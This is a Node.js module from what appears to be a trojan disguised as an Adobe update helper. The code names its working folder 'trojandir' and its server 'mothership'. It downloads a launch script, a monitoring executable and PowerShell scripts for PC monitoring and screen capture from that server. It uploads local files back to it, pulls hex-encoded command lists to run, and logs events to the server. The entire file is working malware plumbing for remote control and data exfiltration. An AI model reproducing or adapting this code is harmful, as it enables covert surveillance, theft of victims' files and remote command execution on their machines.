const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

/*
    status: response.status,
    statusText: response.statusText,
    headers: headersOut,
    downloadOpts : {
        download: true,
        filetype: "txt",
        localpath: outputPath
    }
*/
async function makeGetRequest(
    baseUrl,
    params,
    inputHeaders,
    downloadOpts = null,
) {
    helper.logmsg("starting");

    if (helper.isNullOrWhitespace(baseUrl)) {
        throw new Error("baseUrl is empty");
    } else if (!isValidHttpUrl(baseUrl)) {
        throw new Error("baseUrl is invalid [" + baseUrl + "]");
    }

    const url = new URL(baseUrl);

    helper.logmsg("baseUrl: " + baseUrl);

    if (helper.isValidDict(params)) {
        Object.keys(params).forEach((key) => {
            url.searchParams.append(key, params[key]);
        });
    }


    helper.logmsg("url=" + url.toString());

    if (!helper.isValidDict(downloadOpts)) {
        let outputPath = path.join(
            helper_config.systemconfig.trojandir,
            "download_" + helper.getRandomCode(8)
        );

        downloadOpts = {
            download: true,
            filetype: "txt",
            localpath: outputPath,
        };
    }

    const tinputHeaders = {
        Accept: "*/*",
        "User-Agent": "NodeJS-Fetch-Client",
    };

    if (helper.isValidDict(inputHeaders)) {
        Object.assign(tinputHeaders, inputHeaders);
    }

    let response = null;

    helper.logmsg("executing GET request");

    response = await fetch(url.toString(), {
        method: "GET",
        headers: tinputHeaders,
    });

    if (!response.ok) {
        throw new Error(`HTTP error -- Status: ${response.status}`);
    }

    let headersOut = {};

    for (const [key, value] of response.headers.entries()) {
        if (
            !helper.isNullOrWhitespace(key) &&
            !helper.isNullOrWhitespace(value)
        ) {
            helper.logmsg("response headers key=" + key + " value=" + value);
            headersOut[key] = value;
        }
    }

    let responseOut = {
        status: response.status,
        statusText: response.statusText,
        headers: headersOut,
        // downloadOpts
    };

    helper.logmsg("response status=" + response.status);

    if (!helper.isValidDict(downloadOpts) || !downloadOpts.download) {
        return responseOut;
    }

    if (
        !Object.hasOwn(downloadOpts, "localpath") ||
        helper.isNullOrWhitespace(downloadOpts.localpath)
    ) {
        let outputPath = path.join(
            helper_config.systemconfig.trojandir,
            "download_" + helper.getRandomCode(8)
        );

        downloadOpts.localpath = outputPath;
    }

    if (
        !Object.hasOwn(downloadOpts, "filetype") ||
        helper.isNullOrWhitespace(downloadOpts.filetype)
    ) {
        downloadOpts.filetype = "txt";
    }

    if (downloadOpts.filetype == "txt") {
        let rawText = await response.text();
        fs.writeFileSync(downloadOpts.localpath, rawText, "utf8");
        responseOut.rawText = rawText;
    } else {
        const arrayBuffer = await response.arrayBuffer();
        // const buffer = Buffer.from(arrayBuffer);
        const bufferView = new Uint8Array(arrayBuffer);
        fs.writeFileSync(downloadOpts.localpath, bufferView);
        responseOut.buffer = arrayBuffer;
    }

    responseOut.downloadOpts = downloadOpts;

    helper.logmsg("finished");

    return responseOut;
}
/*
responseOut = {
    downloadOpts { filetype, localpath }
    rawText
    buffer
    status
    statusText
    headers
}
*/

function isValidHttpUrl(string) {
    try {
        const url = new URL(string);
        return url.protocol === "http:" || url.protocol === "https:";
    } catch (error) {
        return false;
    }
}

async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
    helper.logmsg("starting");

    const fileBlob = await fs.openAsBlob(filepath);

    inputHeaders = inputHeaders ?? {};
    inputHeaders["Content-Type"] = "application/octet-stream";

    const url = new URL(baseUrl);

    helper.logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);

    if (helper.isValidDict(params)) {
        Object.keys(params).forEach((key) => {
            url.searchParams.append(key, params[key]);
        });
    }

    helper.logmsg("request url: " + url.toString());

    const request = new Request(url.toString(), {
        method: "PUT",
        body: fileBlob,
        headers: inputHeaders,
        duplex: "half",
    });

    const response = await fetch(request);

    request.headers.forEach((value, key) => {
        helper.logmsg(`${key}: ${value}`);
    });

    const textData = await response.text();

    let headersOut = {};

    for (const [key, value] of response.headers.entries()) {
        if (
            !helper.isNullOrWhitespace(key) &&
            !helper.isNullOrWhitespace(value)
        ) {
            helper.logmsg("response headers key=" + key + " value=" + value);
            headersOut[key] = value;
        }
    }

    let responseOut = {
        status: response.status,
        statusText: response.statusText,
        headers: headersOut,
        responseText: textData,
    };

    helper.logmsg("response status=" + response.status);

    return responseOut;
}

async function download_launch_script() {
    let filename = helper_config.systemconfig.launch_script_fname;

    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(helper_config.systemconfig.trojandir, filename);

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    if (!helper.fileExists(localpath)) {
        throw new Error("download failed for " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
}

async function retrieve_asset(assetfname, assetdir, localdir) {
    let baseUrl =
        helper_config.systemconfig.mothershipassets +
        "/" +
        (helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
        assetfname;
    let localpath = null;

    if (helper.isNullOrWhitespace(localdir))
        localpath = path.join(helper_config.systemconfig.trojandir, assetfname);
    else {
        if (!folderExists(localdir)) {
            fs.mkdirSync(helper_config.systemconfig.nodegsdfilesdir, {
                recursive: true,
            });
        }

        localpath = path.join(localdir, assetfname);
    }

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    /* downloadOpts { filetype, localpath, download }
        rawText
        buffer
        status
        statusText
        headers */

    if (!helper.fileExists(localpath)) {
        throw new Error("retrieve failed for: " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);

    return response;
}

async function download_python(filenames) {
    helper.logmsg("starting");

    filenames = filenames ?? [];
    filenames =
        Array.isArray(filenames) && filenames.length > 0
            ? filenames
            : get_python_install_filenames();

    for (let i = 0; i < filenames.length; i++) {
        let filename = filenames[i];

        let baseUrl =
            helper_config.systemconfig.mothershipassets +
            "/gsd_files/" +
            filename;
        let localpath = path.join(
            helper_config.systemconfig.gsdfilesdir,
            filename
        );

        fs.mkdirSync(helper_config.systemconfig.gsdfilesdir, {
            recursive: true,
        });

        let downloadOpts = {
            download: true,
            filetype: "bin",
            localpath: localpath,
        };

        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

        /* downloadOpts { filetype, localpath, download }
           rawText
           buffer
           status
           statusText
           headers */

        if (!helper.fileExists(localpath)) {
            throw new Error("download failed for " + localpath);
        }

        const stats = fs.statSync(localpath);
        helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
    }
}

async function download_pcmon() {
    // retrieve pcmon.exe, pcmon.dll

    if (!folderExists(helper_config.systemconfig.pcmondir)) {
        fs.mkdirSync(helper_config.systemconfig.pcmondir, { recursive: true });
    }

    if (!helper_config.systemconfig.istpl) {
        await retrieve_asset(
            "pcmon.exe",
            null,
            helper_config.systemconfig.pcmondir
        );
        return;
    }

    if (helper_config.systemconfig.istpl)
        await retrieve_asset(
            "pcmon.dll",
            null,
            helper_config.systemconfig.pcmondir
        );
}

async function download_pspcmon() {
    helper.logmsg("starting");

    let filename = "pc_monitoring.ps1";
    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(helper_config.systemconfig.pspcmondir, filename);

    fs.mkdirSync(helper_config.systemconfig.pspcmondir, { recursive: true });

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    /* downloadOpts { filetype, localpath, download }
        rawText
        buffer
        status
        statusText
        headers */

    if (!helper.fileExists(localpath)) {
        return { state: false, msg: "download failed for " + localpath };
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);

    helper.logmsg("finished");

    return { state: true };
}

// TODO remove and replace with retrieve_asset
async function download_screencapture_script() {
    let filename = "get_full_screen_capture.ps1"; // TODO move to helper_config.systemconfig

    let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
    let localpath = path.join(helper_config.systemconfig.trojandir, filename);

    let downloadOpts = {
        download: true,
        filetype: "bin",
        localpath: localpath,
    };

    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

    if (!helper.fileExists(localpath)) {
        throw new Error("download failed for " + localpath);
    }

    const stats = fs.statSync(localpath);
    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
}

async function upload_file(filename, jobcode, localfpath) {
    if (helper.isNullOrWhitespace(filename)) {
        throw new Error("filename is null or empty");
    }

    if (!helper.fileExists(localfpath)) {
        throw new Error(`file does not exist ${localfpath}`);
    }

    let baseUrl = helper_config.systemconfig.mothership + "/ow/upload.php";

    let kvp = helper_config.systemconfig.statekvp;
    kvp["filename"] = filename;
    kvp["jobcode"] = jobcode;

    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);

    return response;
}

async function retrieveClientJob() {
    helper.logmsg("starting");

    let baseUrl = helper_config.systemconfig.mothership + "/ow/retrieve.php";
    let params = helper_config.systemconfig.statekvp;
    params.filename = "execute_cmdlist";

    let localpath = helper_config.systemconfig.getClientJobPath();

    let downloadOpts = {
        download: true,
        filetype: "txt",
        localpath: localpath,
    };
    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);

    if (!response.headers) {
        throw new Error("could not access response headers");
    }

    if (!helper.fileExists(localpath)) {
        throw new Error("job file does not exist");
    }

    let jobcode = "";
    let jobfilename = "";

    if (keyExists(response.headers, "X-JobCode"))
        jobcode = response.headers[getKey(response.headers, "X-JobCode")];

    if (keyExists(response.headers, "X-JobFilename"))
        jobfilename =
            response.headers[getKey(response.headers, "X-JobFilename")];

    if (helper.isNullOrWhitespace(jobcode)) {
        throw new Error("jobcode is empty");
    }

    if (helper.isNullOrWhitespace(jobfilename)) {
        throw new Error("jobfilename is empty");
    }

    let fileext = path.extname(jobfilename);

    let hextext = fs.readFileSync(localpath, "utf-8");
    let jobtext = Buffer.from(hextext, "hex").toString("utf8");
    localpath = helper_config.systemconfig.getClientJobPath(); // + (fileext ?? "");
    fs.writeFileSync(localpath, jobtext);

    let clientjob = {
        jobcode: jobcode,
        jobtype: "execute_cmdlist",
        localpath: localpath,
        jobfilename: jobfilename,
    };

    helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));

    helper.logmsg("finished");

    return clientjob;
}

async function logmsgMothership(msg, isevent = false, jobcode='') {
    let baseUrl = helper_config.mothershipconfig.logmsgurl;

    let kvp = helper_config.systemconfig.statekvp;

    kvp[isevent ? "event" : "msg"] = msg;
    kvp["jobcode"] = jobcode;

    let response = await makeGetRequest(baseUrl, kvp, undefined, undefined);
    return response;
}

// make GET request to helper.logmsg.php with event = event_code
function logEventMothership(event_code, jobcode) {
    return logmsgMothership(event_code, true, jobcode);
}

module.exports = {
    makeGetRequest,
    logEventMothership,
    logmsgMothership,
    retrieveClientJob,
    upload_file,
};

const helper = require("./adobeupdate.helper.js");
const helper_config = require("./adobeupdate.helper.config.js");
